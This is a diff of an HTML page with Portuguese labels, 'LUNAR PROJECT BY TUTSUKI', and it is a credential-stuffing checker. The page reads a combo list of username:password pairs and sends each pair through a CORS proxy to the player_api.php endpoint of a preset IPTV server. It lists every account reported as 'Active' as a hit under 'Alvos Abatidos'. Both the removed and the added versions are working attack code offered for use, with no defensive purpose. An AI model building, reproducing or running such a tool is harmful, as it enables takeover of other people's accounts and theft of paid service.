@@ -3,62 +3,78 @@
 <head>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>LUNAR PROJECT</title>
+<title>LUNAR PROJECT — BY TUTSUKI</title>
 <style>
-  body { background: #000; color: #00c38e; font-family: monospace; text-align: center; margin: 0; padding: 10px; }
-  .caixa { border: 2px solid #00c38e; padding: 15px; border-radius: 10px; margin: 10px auto; max-width: 500px; background: rgba(0,0,0,0.8); }
-  input, button { width: 90%; padding: 10px; margin: 5px; border-radius: 5px; border: 1px solid #00c38e; background: #111; color: #00c38e; font-weight: bold; }
-  button { background: #00c38e; color: #000; cursor: pointer; }
-  .barra { background: #333; height: 20px; border-radius: 5px; margin: 10px 0; overflow: hidden; }
-  .barra-fill { background: #00c38e; width: 0%; height: 100%; transition: 0.3s; }
-  #logs { text-align: left; font-size: 12px; height: 150px; overflow-y: auto; border: 1px solid #333; padding: 5px; }
+  body { background-color: black; color: #00c38e; font-family: monospace; font-size: 18px; text-align: center; }
+  .caixa { border: 2px solid #00c38e; padding: 10px; border-radius: 10px; margin: 10px auto; max-width: 750px; background: rgba(0,0,0,.55); }
+  select, input { padding: 8px; border-radius: 5px; border: none; width: 90%; margin: 5px; background: #111; color: #00c38e; }
+  button { padding: 8px 14px; background-color: #00c38e; border: none; border-radius: 5px; cursor: pointer; margin: 5px; font-weight: bold; }
+  .progresso-fixo { background: #111; border: 2px solid #00c38e; padding: 10px; border-radius: 10px; margin-bottom: 10px; }
+  .barra { background: #333; border-radius: 5px; overflow: hidden; height: 20px; margin: 5px 0; }
+  .barra-fill { background: #00c38e; height: 100%; width: 0%; text-align: center; color: black; line-height: 20px; }
 </style>
 </head>
 <body>
-<h1>🌘 LUNAR PROJECT</h1>
-<p>BY TUTSUKI</p>
+<header style="padding:20px; background:rgba(0,0,0,0.8); border-bottom:2px solid #00c38e;">
+  <h1 style="margin:0;">🌘 LUNAR PROJECT</h1>
+  <small>BY TUTSUKI</small>
+</header>
 
 <div class="caixa">
+  <label>📂 Escolha o seu Combo.txt:</label><br>
   <input id="combo" type="file" accept=".txt"/>
-  <input id="servidor" placeholder="http://exemplo.com:80" type="text" value="http://2025easy.lat:80"/>
-  <input id="nick" value="Tutsuki" type="text"/>
-  <button onclick="start()">🚀 INICIAR SCAN</button>
+  <label>🌐 Servidor (URL:Porta):</label><br>
+  <input id="servidor" value="http://2025easy.lat:80" type="text"/><br>
+  <label>🖊️ Seu Nick:</label><br>
+  <input id="nick" value="Tutsuki" type="text"/><br>
+  <button onclick="startScan()">🚀 INICIAR SCAN</button>
+</div>
+
+<div class="progresso-fixo caixa">
+  <div>🔎 Testando ➤ <span id="comboStatus">---</span></div>
+  <div>🔥 HITS ➤ <span id="hitsStatus">0</span></div>
+  <div class="barra"><div class="barra-fill" id="barraPreenchida">0%</div></div>
 </div>
 
 <div class="caixa">
-  <div>🔥 HITS: <span id="hCount">0</span></div>
-  <div class="barra"><div id="bFill" class="barra-fill"></div></div>
-  <div id="logs"></div>
+  <h3>Alvos Abatidos</h3>
+  <div id="hitsBox" style="white-space:pre-wrap; text-align:left; font-size: 14px;"></div>
 </div>
 
 <script>
-let hits = 0;
-async function start() {
-  const file = document.getElementById('combo').files[0];
-  const srv = document.getElementById('servidor').value;
-  const logBox = document.getElementById('logs');
-  if(!file || !srv) return alert("Selecione o arquivo e o servidor!");
+let hits = [];
+async function startScan() {
+  const srv = document.getElementById("servidor").value;
+  const comboFile = document.getElementById("combo").files[0];
+  const nick = document.getElementById("nick").value;
+  if (!srv || !comboFile) return alert("Selecione Servidor e Combo!");
   
-  const text = await file.text();
-  const linhas = text.split('\n').filter(l => l.includes(':'));
+  const texto = await comboFile.text();
+  const linhas = texto.split(/\r?\n/).filter(l => l.includes(":"));
   
-  for(let i = 0; i < linhas.length; i++) {
-    const [u, p] = linhas[i].trim().split(':');
-    let porc = Math.floor(((i + 1) / linhas.length) * 100);
-    document.getElementById('bFill').style.width = porc + '%';
+  for (let i = 0; i < linhas.length; i++) {
+    const combo = linhas[i].trim();
+    const [u, p] = combo.split(":");
+    document.getElementById("comboStatus").innerText = combo;
     
+    let porc = Math.floor(((i + 1) / linhas.length) * 100);
+    document.getElementById("barraPreenchida").style.width = porc + "%";
+    document.getElementById("barraPreenchida").innerText = porc + "%";
+
     try {
-      const url = `https://corsproxy.io/?${encodeURIComponent(srv+'/player_api.php?username='+u+'&password='+p)}`;
-      const r = await fetch(url);
-      const d = await r.json();
-      if(d?.user_info?.status === "Active") {
-        hits++;
-        document.getElementById('hCount').innerText = hits;
-        logBox.innerHTML = `✅ HIT: ${u}:${p}<br>` + logBox.innerHTML;
+      const url = `https://corsproxy.io/?${encodeURIComponent(srv + '/player_api.php?username=' + u + '&password=' + p)}`;
+      const res = await fetch(url);
+      const data = await res.json();
+
+      if (data?.user_info?.status === "Active") {
+        const resText = `✅ HIT [${nick}]: ${u}:${p}\n`;
+        document.getElementById("hitsBox").textContent += resText;
+        hits.push(resText);
+        document.getElementById("hitsStatus").innerText = hits.length;
       }
-    } catch(e) {}
+    } catch (e) {}
   }
-  alert("Scan finalizado!");
+  alert("Scan Finalizado!");
 }
 </script>
 </body>
